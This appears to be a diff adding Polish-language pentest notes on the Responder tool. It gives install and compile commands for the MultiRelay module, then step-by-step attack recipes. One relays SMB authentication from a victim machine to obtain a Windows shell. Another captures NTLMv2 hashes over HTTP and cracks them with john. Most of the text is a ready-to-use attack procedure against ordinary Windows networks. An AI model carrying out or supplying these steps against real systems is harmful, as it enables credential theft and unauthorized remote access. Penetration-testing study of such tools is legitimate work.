@@ -1,0 +1,42 @@
+Opis:
+Program do przechwytywania informacji. Glownie z systemu windows. Nasluchuje na wielu protokolach i na nie odpowiada jezeli jest to mozliwe.
+Zbiera przy tym hashe i informacje zapisuje w logach.
+
+[logi]
+/usr/share/responder/log
+
+[Konfiguracja]
+/etc/responder/Responder.conf
+
+[Modul: MultiRelay]
+→ apt-get install python2-dev
+→ pip install pycrypto 
+→ git clone https://github.com/lgandx/Responder.git
+→ sudo apt-get -y install python3-pip gcc-mingw-w64-x86-64 python-crypto screen
+→ sudo pip3 install pycryptodomex
+→ cd Responder/tools/
+→ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv
+→ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
+
+
+Example:
+[Revershell on windows SMB1]
+→ responder -I eth0
+→ vim /etc/responder/responder.conf
+   ⇒ HTTP (Off)
+   ⇒ SMB (Off)
+→ responder -I eth0
+→ Drugi terminal
+   ⇒ responder-MultiRelay -t <ip_ofiary> -u ALL
+→ Teraz na windowsie (ctrl + r) -> “\\<jakis tekst>”
+→ Powinnismy dostac shella
+→ Mozna tez lamac haslo
+   ⇒ cd /usr/share/responder/log
+   ⇒ john SMB-NTLMv2...
+
+[HTTP]
+→ responder -I eth0
+→ Na windowsie adres ip maszyny naszej 
+   ⇒ I wyswietli dane do logowania 
+→ cd /usr/share/responder/log
+→ john HTTP-NTLMv2....
